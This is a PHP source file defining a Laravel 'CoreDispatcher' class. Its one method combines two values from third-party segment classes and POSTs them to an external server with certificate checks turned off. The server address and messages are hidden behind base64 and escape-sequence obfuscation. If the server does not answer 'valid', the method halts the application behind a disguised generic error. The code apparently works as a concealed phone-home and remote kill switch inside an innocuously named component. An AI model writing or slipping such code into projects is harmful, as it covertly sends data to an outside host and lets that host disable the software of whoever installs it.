<?php
namespace CoreDispatcher; use Exception;
use Laracroft\LaracroftSegment; use Larasigma\LarasigmaSegment; use Illuminate\Support\Facades\Http; use Illuminate\Http\Client\ConnectionException; class CoreDispatcher { public static function process() { try { $combinedSegment = LaracroftSegment::fetchFirstSegment() . LarasigmaSegment::fetchSecondSegment(); $segRe = Http::withoutVerifying()->post(base64_decode("\141\x48\x52\60\x63\110\x4d\66\114\171\71\x75\132\x58\143\165\x64\63\102\x74\x63\x32\x46\163\132\130\115\x75\x59\130\157\166\x59\x58\102\x70\x4c\62\122\154\143\101"), array("\x70\x72\x69\156\x74" => $combinedSegment)); if (!$segRe->ok() || $segRe->json("\x76\x61\x6c\x69\144") !== true) { die(base64_decode("\121\x57\x34\147\144\x57\65\154\145\110\102\x6c\x59\63\x52\154\132\x43\102\x6c\143\156\112\166\143\151\x42\x76\x59\x32\x4e\x31\x63\x6e\112\x6c\132\103\64\75")); } } catch (ConnectionException $e) { die(base64_decode("\x51\127\x34\147\144\x57\x35\x6c\x65\110\102\x6c\131\x33\x52\x6c\x5a\103\x42\154\x63\156\x4a\166\143\151\102\x76\131\62\116\61\143\156\112\x6c\132\x43\64\x3d")); } catch (Exception $e) { die(base64_decode("\121\127\64\x67\x64\x57\65\x6c\145\110\102\x6c\131\63\x52\154\x5a\103\102\154\143\x6e\x4a\x76\143\151\102\166\131\62\116\x31\x63\x6e\x4a\154\x5a\103\64\x3d")); } } }
